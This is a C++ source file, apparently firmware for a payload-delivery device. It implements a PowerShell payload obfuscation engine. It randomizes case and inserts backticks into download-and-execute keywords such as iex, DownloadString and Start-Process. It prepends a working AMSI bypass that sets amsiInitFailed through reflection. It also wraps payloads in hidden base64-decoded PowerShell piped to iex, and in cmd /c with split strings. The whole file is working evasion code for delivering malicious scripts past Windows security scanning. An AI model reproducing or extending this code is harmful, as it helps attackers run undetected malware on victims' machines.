/**
 * @file payload_obfuscator.cpp
 * @brief PowerShell Payload Obfuscation Engine Implementation
 * 
 * Techniques inspired by:
 * - DSViper (https://github.com/dagowda/DSViper)
 * - Modern AMSI bypass research (2024)
 */

#include "payload_obfuscator.h"
#include "mbedtls/base64.h"

String PayloadObfuscator::obfuscatePS1(String input, bool useCase, bool useBackticks) {
    String out = input;
    
    if (useCase) {
        out = _randomizeCase(out);
    }
    
    if (useBackticks) {
        out = _insertBackticks(out);
    }
    
    return out;
}

String PayloadObfuscator::_randomizeCase(String input) {
    String out = "";
    bool inUrl = false;
    
    for (unsigned int i = 0; i < input.length(); i++) {
        char c = input[i];
        
        // Detect URL boundaries (naive: http:// or file://)
        if (i > 5 && (input.substring(i-5, i) == "http:" || input.substring(i-5, i) == "file:")) {
            inUrl = true;
        }
        if (inUrl && (c == ' ' || c == '"' || c == '\'')) {
            inUrl = false;
        }
        
        // Only randomize case outside URLs, 30% chance
        if (!inUrl && isalpha(c) && random(10) < 3) {
            c = (islower(c)) ? toupper(c) : tolower(c);
        }
        out += c;
    }
    return out;
}

String PayloadObfuscator::_insertBackticks(String input) {
    String out = input;
    
    // PowerShell keywords to obfuscate (50% chance each)
    const char* keywords[] = {
        "iex", "irm", "powershell", "Invoke-Expression", 
        "Invoke-RestMethod", "Invoke-WebRequest", "DownloadString",
        "WebClient", "Net.WebClient", "Start-Process"
    };
    
    const char* obfuscated[] = {
        "i`ex", "i`rm", "power`shell", "Inv`oke-Exp`ression",
        "Inv`oke-Res`tMethod", "Inv`oke-Web`Request", "Downloa`dString",
        "Web`Client", "Net.Web`Client", "Star`t-Proce`ss"
    };
    
    for (int i = 0; i < 10; i++) {
        if (random(2) == 0) {
            out.replace(keywords[i], obfuscated[i]);
            // Also try lowercase
            String lower = keywords[i];
            lower.toLowerCase();
            String lowerObf = obfuscated[i];
            lowerObf.toLowerCase();
            out.replace(lower, lowerObf);
        }
    }
    
    return out;
}

String PayloadObfuscator::wrapWithAMSIBypass(String payload) {
    // AMSI Bypass - 2024 Variant (Reflection + Force context)
    // Multiple methods to increase success rate
    
    String bypass = "";
    
    // Method 1: Force AMSI init failure via reflection (obfuscated)
    bypass += "$Ref=[Ref].Assembly.GetType(('System.Mana'+'gement.Automa'+'tion.A'+'msi'+'Utils'));";
    bypass += "$A=$Ref.GetField(('amsiIni'+'tFailed'),'NonPublic,Static');";
    bypass += "$A.SetValue($null,$true);";
    
    // Execute original
    bypass += payload;
    
    return bypass;
}

String PayloadObfuscator::_base64Encode(String input) {
    size_t outLen = 0;
    
    // Calculate output length
    mbedtls_base64_encode(NULL, 0, &outLen, (const unsigned char*)input.c_str(), input.length());
    
    // Allocate buffer
    unsigned char* encoded = (unsigned char*)malloc(outLen);
    if (!encoded) return input;
    
    // Encode
    mbedtls_base64_encode(encoded, outLen, &outLen, (const unsigned char*)input.c_str(), input.length());
    
    String result = String((char*)encoded);
    free(encoded);
    
    return result;
}

String PayloadObfuscator::wrapWithBase64(String payload) {
    // Encode the inner payload
    String b64 = _base64Encode(payload);
    
    // Wrap in decoder: powershell -enc <base64>
    // Note: -enc expects UTF-16LE base64, so we use a different approach:
    // [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")) | iex
    
    String wrapper = "powershell -NoP -W Hidden -c \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('";
    wrapper += b64;
    wrapper += "'))|i`ex\"";
    
    return wrapper;
}

String PayloadObfuscator::wrapWithEnvVar(String payload) {
    // Environment variable concatenation bypass
    // Uses $env:comspec to hide 'powershell' keyword
    // e.g., &($env:comspec[4,15,25]-join'') means 'iex'
    
    // Simpler approach: use string concatenation
    // ('p'+'ow'+'ers'+'hell') = 'powershell'
    
    String obf = "";
    
    // Replace 'powershell' with env trick
    String pwsh = payload;
    pwsh.replace("powershell", "&('Powe'+'rShe'+'ll')");
    pwsh.replace("PowerShell", "&('Powe'+'rShe'+'ll')");
    
    // Wrap in cmd.exe to further obfuscate
    obf = "cmd /c \"";
    obf += pwsh;
    obf += "\"";
    
    return obf;
}
